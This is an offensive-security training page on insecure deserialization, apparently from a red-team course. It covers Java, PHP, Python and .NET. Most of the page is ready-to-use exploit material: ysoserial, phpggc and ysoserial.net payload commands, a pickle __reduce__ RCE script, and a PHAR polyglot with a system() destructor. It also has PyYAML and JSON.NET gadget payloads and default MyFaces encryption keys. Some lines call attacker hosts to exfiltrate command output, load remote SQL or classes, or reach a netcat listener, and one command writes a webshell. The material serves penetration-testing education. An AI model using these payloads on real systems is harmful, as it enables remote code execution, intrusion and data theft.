---
layout: training-page
title: "Insecure Deserialization — Red Team Academy"
module: "Web Hacking"
tags:
  - deserialization
  - rce
  - java
  - php
  - python
  - dotnet
  - ysoserial
  - gadget-chains
page_key: "web-insecure-deserialization"
render_with_liquid: false
---

# Insecure Deserialization

Serialization converts an object's state into a byte stream for storage or transmission. Deserialization reconstructs the original object from that byte stream. When applications deserialize user-controlled data without validation, attackers can craft malicious serialized objects that execute arbitrary code during the deserialization process — often leading to Remote Code Execution (RCE).

## Identifying Serialized Data

The first step is recognizing which serialization format is in use. Each format has a distinctive magic byte sequence:

| Format | Magic Bytes (Hex) | Base64 Prefix | Where Found |
| --- | --- | --- | --- |
| .NET ViewState | `FF 01` | `/w` | Hidden form inputs, `__VIEWSTATE` parameter |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF 01` | `AAEAAAD` | Cookies, POST bodies |
| Java Serialized | `AC ED` | `rO` | Cookies, POST bodies, Java RMI |
| PHP Serialized | `4F 3A` | `Tz` | Cookies, session data — prefixes like `O:, a:, s:, i:, b:` |
| Python Pickle | `80 04 95` | `gASV` | Cookies, API bodies — opcodes like `(lp0, S'Test'` |
| Ruby Marshal | `04 08` | `BAgK` | Cookies, session data |

## POP Gadgets

A POP (Property-Oriented Programming) gadget is a piece of code in an application's existing codebase that is invoked during deserialization. Attackers chain gadgets together — one gadget's output becomes the next gadget's input — until the chain achieves code execution. Gadgets must be serializable, have accessible properties, and implement methods called during deserialization (`__wakeup`, `readObject`, `__destruct`, etc.).

## Java Deserialization

### Detection

```
# Java serialized objects start with these bytes
AC ED 00 05   (hex)
rO0           (Base64 prefix)
H4sIAAAAAAAAAJ (Base64 of gzip-compressed serialized object)

# Content-Type header indicating Java serialization
Content-Type: application/x-java-serialized-object
```

### ysoserial — Payload Generation

ysoserial generates exploit payloads for unsafe Java deserialization by leveraging gadget chains found in common Java libraries:

```
# Generate payload using CommonsCollections1 gadget (requires commons-collections 3.1)
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin

# Groovy gadget — execute command
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin

# DNS-based detection — confirm deserialization without RCE risk
java -jar ysoserial.jar URLDNS http://YOUR-INTERACTSH-URL > detect.bin

# Execute and pipe to target
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64 -w0
```

### ysoserial Gadget Chains (Selected)

```
CommonsCollections1    commons-collections:3.1
CommonsCollections6    commons-collections:3.1 (bypasses Java 8+ readObject restrictions)
CommonsBeanutils1      commons-beanutils:1.9.2, commons-collections:3.1
Spring1                spring-core:4.1.4, spring-beans:4.1.4
Groovy1                groovy:2.3.9
Jdk7u21                JDK 7u21 (no external deps required)
URLDNS                 JDK only — DNS lookup for detection (no RCE)
```

### Burp Extensions for Java Deserialization

- **JavaSerialKiller** — Burp extension for Java deserialization attacks — `github.com/NetSPI/JavaSerialKiller`
- **Java Deserialization Scanner** — All-in-one detection and exploitation — `github.com/federicodotta/Java-Deserialization-Scanner`
- **burp-ysoserial** — ysoserial integration with Burp — `github.com/summitt/burp-ysoserial`

### marshalsec — Alternative Payload Generator

```
java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
```

### Jackson JSON Deserialization

Jackson is a popular Java JSON library. With Polymorphic Type Handling enabled, attackers can specify arbitrary class types in JSON, triggering unsafe code execution when those classes are instantiated.

Detect Jackson by sending invalid JSON and checking for the error class in the response:

```
com.fasterxml.jackson.databind.exc.MismatchedInputException
```

CVE-2019-12384 — JDBC URL injection via DriverManagerConnectionSource:

```
[
  "ch.qos.logback.core.db.DriverManagerConnectionSource",
  {
    "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/inject.sql'"
  }
]
```

### SnakeYAML Deserialization (Java)

SnakeYAML can instantiate arbitrary Java classes when loading untrusted YAML:

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## PHP Deserialization (Object Injection)

### Key Magic Methods

PHP calls these methods automatically during serialization/deserialization — gadget chains exploit them:

- `__wakeup()` — called when object is unserialized
- `__destruct()` — called when object is garbage collected
- `__toString()` — called when object is used as a string
- `__construct()` — called when object is created
- `__call()` — called when invoking inaccessible methods

### PHP Serialized Object Format

```
# Basic serialized data
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

# Object with eval payload (PHPObjectInjection class with inject property)
O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}

# Boolean type juggling bypass — true == "any string"
a:2:{s:8:"username";b:1;s:8:"password";b:1;}

# Object reference bypass for random value comparison
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

### phpggc — PHP Gadget Chain Generator

phpggc generates PHP deserialization payloads for common frameworks:

```
# Monolog RCE — execute phpinfo()
phpggc monolog/rce1 'phpinfo();' -s

# Monolog RCE — execute system command
phpggc monolog/rce1 assert 'phpinfo()'

# SwiftMailer — write webshell to disk
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data

# Monolog RCE as PHAR archive
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

Supported frameworks: Laravel, Symfony, SwiftMailer, Monolog, SlimPHP, Doctrine, Guzzle.

### PHAR Deserialization

PHAR (PHP Archive) files contain serialized metadata that is deserialized when the file is accessed via the `phar://` stream wrapper. If an application passes user-controlled filenames to file functions like `file_get_contents`, `file_exists`, or `fopen`, a PHAR payload can trigger deserialization:

```
# If the application calls: file_get_contents($userInput)
# Inject: phar://./uploads/evil.jpg

# Create a PHAR with __destruct RCE payload
<?php
class AnyClass {
    public $data = null;
    public function __construct($data) { $this->data = $data; }
    function __destruct() { system($this->data); }
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
// Disguise as JPEG with JPEG magic bytes in the stub
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
// Rename: mv evil.phar evil.jpg
// Upload evil.jpg, then trigger: file_exists("phar://./uploads/evil.jpg")
?>
```

## Python Deserialization

### Vulnerable Sinks to Look For

```
cPickle.loads(data)
pickle.loads(data)
_pickle.loads(data)
jsonpickle.decode(data)
```

### Pickle RCE Payload

The `__reduce__` method controls what happens when an object is deserialized. An attacker can return a tuple of (callable, args) that executes arbitrary code:

```
import pickle
import base64

class RCE:
    def __reduce__(self):
        return eval, ("__import__('os').system('id')",)

pickled = pickle.dumps(RCE())
print(base64.b64encode(pickled).decode())
# Submit the base64 output as the serialized cookie/token
```

### Python Pickle RCE Variants

```
__import__('os').system('whoami')                              # Reflected RCE
getattr('', __import__('os').popen('whoami').read())           # Error-Based RCE
__import__("os").popen("id && sleep 5").read()                  # Time-Based RCE
```

### PyYAML Deserialization RCE

PyYAML prior to version 6.0 (or when using unsafe loaders) can instantiate Python objects from YAML tags. Since 6.0, the default loader is SafeLoader — only `yaml.unsafe_load` and explicit `Loader=yaml.UnsafeLoader` are vulnerable:

```
# Execute arbitrary OS command via PyYAML unsafe load
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["cat","/etc/passwd"]]

# Subprocess Popen
!!python/object/apply:subprocess.Popen
- ls

# Execute Python code
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag.txt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

## .NET Deserialization

### Detection

```
# .NET BinaryFormatter magic bytes (hex)
00 01 00 00 00 FF FF FF FF 01

# Base64 prefix
AAEAAAD

# .NET ViewState (Base64)
/w  (short form)
AAEAAD  (BinaryFormatter wrapped in ViewState)
```

### ysoserial.net — .NET Payload Generation

```
# JSON.NET with ObjectDataProvider gadget — execute calc.exe
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t

# BinaryFormatter with PSObject gadget
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t

# NetDataContractSerializer — TypeConfuseDelegate gadget
./ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t

# LosFormatter (uses BinaryFormatter internally)
./ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t

# DotNetNuke exploit — read arbitrary file
./ysoserial.exe -p DotNetNuke -m read_file -f win.ini

# Read long command from file
cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
```

### JSON.NET Payload Example

```
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### .NET ViewState Deserialization

ViewState in ASP.NET stores page state in a hidden field. If not encrypted or signed (or using weak default keys), it can be tampered with to achieve RCE.

```
# Check ViewState encoding
# base64 starting with rO0 = Java serialized
# base64 starting with /w  = .NET ViewState
# base64 starting with H4sI = gzip+base64

# Server-side vs client-side storage
# Server side: value="-XXX:-XXXX" (just an ID reference)
# Client side: base64 + gzip + serialized object

# Apache MyFaces default encryption keys (try these if no custom key)
AES CBC/PKCS5Padding: NzY1NDMyMTA3NjU0MzIxMA==
DES:                  NzY1NDMyMTA=
```

## General Testing Methodology

1. Identify serialized data in cookies, POST bodies, hidden fields, and API parameters
2. Decode (base64/hex) and check magic bytes to identify the serialization format
3. Use the URLDNS/DNS gadget with ysoserial first — safe detection without triggering RCE
4. If DNS callback is received, confirm the library/gadget chain version by testing progressively
5. Generate an RCE payload targeting the confirmed gadget chain
6. For blind exploitation, use time-based commands (`sleep 5`) to confirm execution

## Resources

- PayloadsAllTheThings — Insecure Deserialization — `github.com/swisskyrepo/PayloadsAllTheThings`
- ysoserial — Java deserialization payload generator — `github.com/frohoff/ysoserial`
- ysoserial.net — .NET deserialization payload generator — `github.com/pwntester/ysoserial.net`
- phpggc — PHP gadget chain generator — `github.com/ambionics/phpggc`
- Java Deserialization Cheat Sheet — GrrrDog — `github.com/GrrrDog/Java-Deserialization-Cheat-Sheet`
- marshalsec — Java unmarshaller security — `github.com/mbechler/marshalsec`
**PortSwigger Practice Labs (recommended in sequence):**
- Modifying serialized data types — `portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types`
- Arbitrary object injection in PHP — `portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php`
- Exploiting Java deserialization with Apache Commons — `portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons`

- PortSwigger Deserialization Web Security Academy — `portswigger.net/web-security/deserialization`
- Exploiting Deserialization in ASP.NET via ViewState — Soroush Dalili — `soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate`
- DeserLab — Java deserialization practice lab — `github.com/NickstaDB/DeserLab`
